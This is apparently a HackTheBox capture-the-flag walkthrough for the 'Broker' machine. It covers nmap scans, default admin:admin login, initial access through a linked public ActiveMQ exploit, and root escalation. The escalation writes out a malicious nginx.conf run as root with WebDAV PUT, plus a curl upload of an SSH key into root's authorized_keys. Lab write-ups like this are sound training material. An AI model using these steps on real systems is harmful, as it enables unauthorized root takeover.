---
title: "Broker"
date: 2025-03-15
categories: HTB
tags: ["broker", "htb walkthrough", "ctf", "cybersecurity", "hackthebox", "htb writeup", "penetration testing", "writeup", "htb"]
---

# Broker

# Broker

# Summary
- ActiveMQ 5.15.15
# Enumeration
- Using `admin : admin` provides access to the admin portal.
# Initial Access
- Using the public exploit, gain initial access as activemq.
	- Had to install go lang. 
# Privilege Escalation
- `sudo -l` activemq has sudo privileges to run `/usr/sbin/nginx`.
- Modify `nginx.conf` with malicious payload.
	- change the user to root from www-data so the nginx process runs from root.
	- add listening port.
- Generate ssh key.
	- `curl PUT` to put the generated ssh public key via the listening port. 
- SSH as root.a

# Enumeration
## Nmap
# TCP
```sh
└─$ nmap -sC -sV 10.10.11.243                 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-01 13:33 AEST
Nmap scan report for 10.10.11.243
Host is up (0.016s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# UDP
```sh
└─$ sudo nmap -sU --top-ports 20 -sV 10.10.11.243 
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-01 13:34 AEST
Nmap scan report for 10.10.11.243
Host is up (0.017s latency).

PORT      STATE         SERVICE      VERSION
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   closed        ntp
135/udp   closed        msrpc
137/udp   closed        netbios-ns
138/udp   closed        netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   closed        microsoft-ds
500/udp   closed        isakmp
514/udp   closed        syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  closed        nat-t-ike
49152/udp closed        unknown
```
## 80-HTTP
![[/assets/images/broker1.png]]
-> signed in as `admin : admin`

![[/assets/images/broker2.png]]
- ActiveMQ 5.15.15
# gobuster
![[/assets/images/broker3.png]]

# Initial Access
https://github.com/X1r0z/ActiveMQ-RCE/tree/main

https://www.prio-n.com/blog/cve-2023-46604-attacking-defending-ActiveMQ

Modified poc.xml
![[/assets/images/broker4.png]]

install golang
https://medium.com/@yadav-ajay/go-lang-on-kali-linux-5cc40a78d7de

![[/assets/images/broker5.png]]

# Privilege Escalation
![[/assets/images/broker6.png]]
![[/assets/images/broker7.png]]

![[/assets/images/broker8.png]]
```sh
/usr/bin/java -Xms64M -Xmx1G -Djava.util.logging.config.file=logging.properties -Djava.security.auth.login.config=/opt/apache-activemq-5.15.15//conf/login.config -Dcom.sun.management.jmxremote -Djava.awt.headless=true -Djava.io.tmpdir=/opt/apache-activemq-5.15.15//tmp -Dactivemq.classpath=/opt/apache-activemq-5.15.15//conf:/opt/apache-activemq-5.15.15//../lib/: -Dactivemq.home=/opt/apache-activemq-5.15.15/ -Dactivemq.base=/opt/apache-activemq-5.15.15/ -Dactivemq.conf=/opt/apache-activemq-5.15.15//conf -Dactivemq.data=/opt/apache-activemq-5.15.15//data -jar /opt/apache-activemq-5.15.15//bin/activemq.jar start 
```

```sh
# show comments only
cat nginx.conf | grep -v '\#' | grep .
```

![[/assets/images/broker9.png]]

change the user to root on `nginx.conf`

we will use the `ngx_http_dav_module` to write our public SSH key into the root user's `authorized_keys` file. To do so, we start by creating the malicious NGINX configuration file, which looks as follows:

pwn.conf
```sh
user root; # worker processes will be run by root
worker_processes 4;
pid /tmp/nginx.pid;
events {
		worker_connections 768;
}
http {
	server {
		listen 1337;
		root /;
		autoindex on;
		dav_methods PUT;
	}
}
```

![[/assets/images/broker10.png]]

![[/assets/images/broker11.png]]

![[/assets/images/broker12.png]]

From Kali
```sh
ssh-keygen -f broker

curl 10.10.11.243:1337/root/.ssh/authorized_keys --upload-file broker.pub
```

ssh as root
```sh
ssh -i broker root@10.10.11.243
```

![[/assets/images/broker13.png]]
